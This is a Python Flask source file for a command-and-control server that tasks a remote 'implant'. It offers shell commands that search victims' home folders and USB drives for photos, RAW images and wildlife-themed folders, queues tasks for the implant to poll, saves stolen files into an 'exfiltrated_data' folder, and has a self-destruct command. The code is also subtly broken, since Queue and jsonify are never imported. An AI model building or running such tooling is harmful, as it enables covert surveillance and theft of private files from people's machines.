from flask import Flask, request
import json
import os

app = Flask(__name__)

# Predefined command menu
command_menu = {
    0: 'ls -lah ~/Pictures ~/Photos ~/Images 2>/dev/null', # List contents of common photo folders
    1: 'find /home/ -type f \( -iname "*.jpg" -o -iname "*.jpeg" \) -size +1M', # Find large image files
    2: 'find /home/ -type f \( -iname "*.raw" -o -iname "*.cr2" -o -iname "*.nef" \)', # Search for RAW image formats (professional cameras)
    3: 'find /home/ -type d \( -iname "*wildlife*" -o -iname "*safari*" -o -iname "*animals*" \)', # Search for useful keywords
    4: 'ls /mnt/ /media/ /run/media/ 2>/dev/null', # Check mounted external storage devices (i.e., USB drives or SD cards)
    5: 'destroy', # Special non-Linux command that causes client to self-destruct
    6: 'upload_path' # Special non-Linux command to request a specific file
}

# Queue of tasks assigned to the implant
tasks = Queue()

# A controller can invoke the default endpoint to view the command menu
@app.route('/')
def menu():
    return jsonify(command_menu)

# A controller can invoke this endpoint to task the client
@app.route('/assign/<int:cmd_index>', methods=['POST'])
def assign_command(cmd_index):
    if 0 <= cmd_index < len(command_menu):
        if cmd_index == 6:
            data = request.get_json()
            path = data.get('path')
            if not path:
                return jsonify({"error": "Missing 'path'"}), 400
            tasks.put(f"upload {path}")
            return jsonify({"message": f"Queued upload: {path}"})
        else:
            tasks.put(command_menu[cmd_index])
            return jsonify({"message": f"Queued: {command_menu[cmd_index]}"})
    else:
        return jsonify({"error": "Bad Request"}), 400


# Implant periodically polls this endpoint to get a task
@app.route('/task', methods=['POST'])
def get_task():
    if not tasks.empty():
        task = tasks.get()
        return jsonify({"task": task})
    return jsonify({"task": "sleep 10"})


# Implant invokes this endpoint to send images back to the server
@app.route('/upload', methods=['POST'])
def receive_data():
    file = request.files.get('file')
    if file:
        filename = file.filename
        save_path = os.path.join('exfiltrated_data', filename)

        # Make sure directory exists
        os.makedirs('exfiltrated_data', exist_ok=True)

        # Check for file size (e.g., 10MB limit)
        if len(file.read()) > 10 * 1024 * 1024:  # 10MB limit
            return jsonify({"error": "File size exceeds 10MB"}), 400

        # Save the uploaded file
        file.save(save_path)

        print(f"Received and saved file: {filename}")
        return jsonify({"status": "File received"})
    else:
        return jsonify({"error": "No file provided"}), 400


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
